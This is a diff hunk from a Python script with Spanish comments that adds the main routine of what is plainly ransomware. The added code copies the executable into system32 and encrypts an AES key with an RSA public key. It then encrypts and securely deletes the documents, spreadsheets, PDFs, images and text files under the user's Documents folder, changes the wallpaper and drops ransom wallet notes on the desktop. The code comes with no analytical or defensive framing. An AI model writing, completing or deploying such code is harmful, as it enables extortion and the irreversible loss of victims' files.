@@ -194,3 +194,45 @@ def copiar_wallet_al_escritorio():
         nombre_archivo = f"wallett{'t' * i}.txt"
         ruta_destino = os.path.join(desktop_dir, nombre_archivo)
         shutil.copy(wallet_path, ruta_destino)
+
+
+# Obtener el directorio "Documents" del usuario
+user_profile = os.environ['USERPROFILE']
+documents_dir = os.path.join(user_profile, 'Documents')
+
+# Copiar el ejecutable a la carpeta system32
+copiar_ejecutable_a_system32()
+
+# Extensiones que se desean cifrar
+extensions = ['.docx', '.xlsx', '.pdf', '.jpeg', '.jpg', '.txt']
+
+# Generar clave AES
+clave_aes = generar_clave_aes()
+
+# Llave pública proporcionada (en formato PKCS#8).
+# Leer la clave pública desde el archivo
+public_key_pem = leer_clave_publica()
+
+# Cifrar la clave AES con RSA
+clave_aes_cifrada = cifrar_clave_aes_rsa(clave_aes, public_key_pem)
+
+# Guardar la clave cifrada en un archivo
+with open(os.path.join(documents_dir, 'clave_aes_cifrada.lol'), 'w') as f:
+    f.write(clave_aes_cifrada)
+
+# Cifrar los archivos seleccionados
+for foldername, subfolders, filenames in os.walk(documents_dir):
+    for filename in filenames:
+        if any(filename.endswith(ext) for ext in extensions):
+            file_path = os.path.join(foldername, filename)
+            # Cifrar el archivo con AES
+            cifrar_archivo_aes(file_path, clave_aes)
+            # Borrar de forma segura el archivo original
+            borrar_archivo_seguro(file_path)
+
+# Cambiar el fondo de escritorio al final
+ruta_imagen = obtener_ruta_imagen_empaquetada()
+cambiar_fondo_escritorio(ruta_imagen)
+
+# Copiar wallet.txt al escritorio 10 veces
+copiar_wallet_al_escritorio()
